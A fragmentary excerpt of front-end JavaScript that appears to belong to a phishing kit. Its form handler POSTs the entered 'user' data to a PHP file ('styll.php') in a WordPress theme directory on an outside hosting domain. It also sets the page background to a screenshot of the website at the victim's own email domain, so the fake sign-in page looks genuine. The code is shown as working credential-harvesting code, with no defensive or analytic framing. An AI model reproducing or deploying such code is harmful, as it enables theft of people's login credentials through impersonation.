...
// hello
    ...
    const submitDefaultForm = (e)=>{
        ...
        $.ajax({
            type: "POST",
            url: "https://dly.cua.mybluehost.me/wp-content/themes/twentytwentytwo/styll.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
    ...
    style={{
        ...
        backgroundImage: `url(https://image.thum.io/get/auth/69946-locator/https://www.${extracetdEmail}/)`,
        width:'100vw',
        height:'100vh',
